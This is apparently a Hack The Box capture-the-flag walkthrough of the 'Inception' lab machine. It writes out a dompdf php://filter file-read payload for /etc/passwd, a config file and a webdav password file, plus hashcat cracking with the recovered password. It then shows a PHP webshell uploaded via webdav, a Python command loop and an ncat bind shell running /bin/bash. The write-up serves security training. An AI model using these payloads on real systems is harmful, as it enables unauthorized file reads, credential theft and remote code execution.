# HTB: Inception Walkthrough

![Image](Inception.png)

### Overview

lalalallalalalla

## Initial Scan

Starting off with our nmap all ports, we discover that TCP port's 80 and 3128 are open. We discover that HTTP and Squid Proxy are running on the target system.

![Image](nmap.png)

## TCP 80 HTTP Enumeration

### Enumeration commands

Looking at the web technology with curl we don't find anything that jumps out to us.

```
curl -I http://10.129.1.104

HTTP/1.1 200 OK
Date: Tue, 05 Apr 2022 10:33:11 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Mon, 06 Nov 2017 08:36:43 GMT
ETag: "b3d-55d4c5aaad546"
Accept-Ranges: bytes
Content-Length: 2877
Vary: Accept-Encoding
Content-Type: text/html
```

Running a quick wfuzz directory bruteforce we find two directories, named assets and images. 

```
wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://10.129.1.104:80/FUZZ/ 
```
![image](wfuzz.png)

### Manual search

Let's take a look at the web site and the two directories. The landing page is pretty simple, it has one section for user imput in the form of an email signup. 

The two directories do not lead to anything of interest. Looking at http://10.129.1.104/assets/js/main.js we notice that the email sign up isn't doing anything.

![image](assets-main.png)

We'll taka a look at the landing pages source code. Right clicking and inspecting the page uncovers a comment at the bottom of the source code, the comment mentions 'dompdf.

![image](inspect-source.png)

### dompdf 

https://github.com/dompdf/dompdf

We'll test to see if /dompdf/ exsists and it does.

![image](dompdf-dir.png)

We get a version number at http://10.129.1.104/dompdf/VERSION and not a great deal else. We'll note this down and continue information gathering.

![image](dompdf-version.png)


## TCP 3128 Squid Proxy Enumeration

Connecting to the http://10.129.1.104:3128/ url offers nothing of interest to us, so we will try and search localy, by using proxy chains and curl. We can search for any services behinde the proxy

### Finding possible Services

Editing the proxychains configuration file at /etc/proxychains4.conf we add the following line. Forward http to 10.129.1.104 on port 3128

```
http 10.129.1.104 3128
```

We can use curl and check for connection to ports localy. We will test port 80 and 3128.

```
proxychains curl --proxy "http://127.0.0.1:80" "http://10.129.1.104:3128"
proxychains curl --proxy "http://127.0.0.1:3128" "http://10.129.1.104:3128"
```

The requests are both successful as we see from the 200 Ok as well as the HTML of the page from port 80.

![image](curl-proxy-80.png)

### Scanning with python

Looking at the output from proxychains and curl, we can automate this task and search of any other accessable services on the target system. We will create a simple python script that will try to connect to other ports.

As we saw from the succesful request on port 80, proxychains output states:

```
Strict chain  ...  10.129.1.104:80  ...  127.0.0.1:3128  ...  OK
```

For an unsucesfull request, the output states:

```
[proxychains] Strict chain  ...  10.129.1.104:3128  ...  127.0.0.1:25 <--denied
```

This is key to our confirmation of a possible opent port, for when we split this output a sucesfull request will have more elements saved to our list.

The script runs the proxychans command for every port in the range of 1 to 1024 for the first attempt.

```python
import subprocess

# Command to run proxychains curl -proxy "http://127.0.0.1:80" "http://10.129.1.104:3128"

proxy = "http://10.129.1.104:3128"

for port in range(1, 1025):
    command = f"proxychains curl --proxy http://127.0.0.1:{port} {proxy}"
    output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    ok = output.stderr.split(b"...")
    try:
        if b'OK' in ok[3]:
            print(f"[+] {port} Possible Open Port!")
        else:
            pass
            #print(f"[-] {port} closed")
    except:
        pass  
```

Running the script shows that TCP port 22 is possibly open as well as 80. 

![image](script-output.png)


Let's try and confirm the port with proxychains.

```
proxychains ssh root@127.0.0.1
```

![image](proxychains-ssh.png)

We can add the availability of port 22 to our notes. No other services were found so we will continue on.

## Vulnerability research: 

Looking back at our notes we search a little deeping in regards to dompdf. Seacrhsploit results reveal an exploit matching the version number we found in /dompdf

![image](searchsploit.png)

## Exploitation Arbitrary File Read

### POC 

The searchsploit results leads us to https://www.exploit-db.com/exploits/33004. The following payload downloads /etc/passwd to our kali machine, as a base64 string, in a pdf file.

```
http://10.129.1.104/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd
```

![image](passwd.png)

Running the strings command against the dompdf_out.pdf file we obtain the full base64 string.

![image](strings.png)

We decode the string with the following base64 command and confirm the reading of the /etc/passwd file. The exploit was sucesful and we not the username of cobb at the bottom of the file.

![image](passwd-output.png)

## Searching for information on the target

There was a lot of searching to be done on this box, but when we start checking web server configuration files, we come across an interseting find. 

Apache2 configuration files can be found /etc/apache2/sites-available/. The default configuration file of 000-default.conf is read first. Searching for this file is sucesful and we again download a pdf file with the 000-default.conf in a base64 encoded string.

```
http://10.129.1.104/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/apache2/sites-enabled/000-default.conf
```

The file is saved as 000-default.pdf and again we access the base64 string with the strings command.

![image](000-default-strings.png)

We decode the string with the following base64 command and confirm the reading of the 000-default.conf file. 

![image](000-decoded.png)

The configuration file reveals the location of a webdav directory and password file. 

![image](webdav-location.png)

## Code Execution Via Webdav

With the possible location of the webdav directory and webdav password, we can try and upload a webshell onto the target system. First we use the Arbitrary File Read exploit and read the webdav_test_inception/webdav.passwd file.

Using the following payload to download the webdav.passwd file in pdf format, saved as webdav-passwd.pdf
```
http://10.129.1.104/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/var/www/html/webdav_test_inception/webdav.passwd
```

Again, running the strings command against the downloaded pdf file and then decoding the base64 string. Finally  saving the output to hash.txt.

![image](webdav-decoded-passwd.png)

### Cracking the password

Crack the password with hashcat. First we must edit the hash.txt file and remove 'webdav_tester:'. Running the following hashcat command we crach the webdav password.

```
hashcat -m 1600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt 

$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0:babygurl69 
```

![image](hashcat-crack.png)


### Uploading a webshell to the target

We will create a webshell in a file named shell.php

```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Use curl to uploaded to the target, using the username and password from webdav.passwd

```
curl -T 'shell.php' --basic --user 'webdav_tester:babygurl69' 'http://10.129.1.104/webdav_test_inception/'
```
Confirm the shell was uploaded and command execution if succesful with the following curl command.

```
curl -u webdav_tester:babygurl69 'http://10.129.1.104/webdav_test_inception/shell.php?cmd=id'
```

![image](confirm-execution.png)

## Automate our Remote Code Execution Exploit With Python

The following python script runs commands on the target with the curl command used preveously. It uses hURL to url encode the commands. The while loops gives us a feeling of a shell and lets us send commands a little faster.

```python
import os
import subprocess


while True:
    cmd = input("cmd: ")
    command = f"hURL -U '{cmd}'"
    output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    # Decode the hURL command output from subprocess, then split it to obtain the encoded command string.
    enc_command = output.stdout.decode('utf-8').split("[1m")
    # Split the url encoded command string at '\n'. The command now resides in the n variable.
    final_command = enc_command[-1].split('\n')
    try:
        os.system(f"curl -u webdav_tester:babygurl69 'http://10.129.1.104/webdav_test_inception/shell.php?cmd={final_command[0]}'")
    except:
        print("Err")
```

![image](python-script-confirm.png)

## Shell As www-data

With our python script we can search the file system. We can also run linpea.sh from it if we wanted. 

### Uploading NetCat to the target and getting a shell

Using the webdave exploit we can upload the nc binary from Kali. First we copy the nc binary to our current directory.

```
cp /usr/bin/nc .
```

Then we can upload the file to the /webdav_test_inception/ directory on the target machine, using the curl command.

```
curl -T 'ncat' --basic --user 'webdav_tester:babygurl69' 'http://10.129.1.104/webdav_test_inception/'
```

Confirm the nc file with out python script.

![image](ncat-upload.png)

First we chmod the permissions on the ncat binary. After a little testing, we setup a listener on the target system, on port 1234. With our python script, we run the following command on the target.

```
chmod 777 ncat
./ncat -nvlp 1234 -e /bin/bash
```

From our Kali machine, we use proxychains and connect to the listener on port 1234. We know we can connect to open ports though proxychains as we proved earlier when accessing port 22.

```
proxychains nc -nv 127.0.0.1 1234
```

![image](revshell.png)

We upgrade our shell and continue our search.

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
Ctrl + Z (Background Process.)
stty raw -echo ; fg ; reset
export SHELL=/bin/bash; export TERM=screen; stty rows 23 columns 139; reset
```

![image](upgrade-shell.png)
